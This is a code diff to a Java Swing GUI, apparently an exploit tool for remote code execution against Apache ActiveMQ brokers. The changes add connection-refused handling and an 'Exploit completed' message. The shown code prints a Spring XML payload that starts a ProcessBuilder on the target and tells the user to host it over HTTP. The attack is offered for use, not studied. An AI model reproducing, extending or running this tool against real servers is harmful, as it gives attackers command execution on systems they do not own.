@@ -11,6 +11,7 @@ import javax.jms.JMSException;
 import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.net.ConnectException;
 import java.net.SocketTimeoutException;
 
 public class ActiveMQ_RCE_GUI {
@@ -33,7 +34,7 @@ public class ActiveMQ_RCE_GUI {
             @Override
             public void actionPerformed(ActionEvent e) {
                 AreaAppend("Please configure the Payload and download it through HTTP. The content is:");
-                AreaAppend("\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
+                AreaAppend("\n\n" +
                         "\n" +
                         "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                         "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
@@ -140,7 +141,9 @@ public class ActiveMQ_RCE_GUI {
 
                 // 或者记录错误日志
                 // logger.error("连接超时：无法连接到消息代理", e);
-            } else {
+            } else if(e.getCause() instanceof ConnectException){
+                AreaAppend("[-] Connection refused (Connection refused)");
+            }else {
                 // 其他JMS异常
                 AreaAppend("[-] JMSException：" + e.getMessage().toString());
                 // 或者记录错误日志
@@ -151,11 +154,11 @@ public class ActiveMQ_RCE_GUI {
         error.printStackTrace();
 
         }
+        AreaAppend("[+] Exploit completed");
     }
 
     public static void main(String[] args) {
         JFrame frame = new JFrame("ActiveMQ RCE GUI v1.0.0 pro max by:0vercl0k");
-
         frame.setContentPane(new ActiveMQ_RCE_GUI().panel1);
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         frame.pack();
